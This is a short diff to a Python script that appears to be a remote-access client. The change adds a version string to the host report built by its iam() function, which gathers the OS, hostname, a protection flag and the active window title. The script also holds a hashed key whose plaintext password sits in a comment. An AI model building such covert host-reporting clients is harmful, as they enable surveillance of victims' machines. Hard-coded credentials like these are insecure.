@@ -14,6 +14,7 @@ PORT = 4434
 active = False
 data = ''
 passKey = r'1705a7f91b40320a19db18912b72148e' # key: paroli123
+__version__ = '1.0'
 
 # INIT Widnows DLL's
 Kernel32 = ctypes.windll.kernel32
@@ -91,6 +92,7 @@ def iam():
     data['os'] = str(platform.platform())
     data['protection'] = str(active)
     data['user'] = str(platform.node())
+    data['version'] = __version__
     data['activewindowtitle'] = GetWindowTitle()
     return str(data)
 
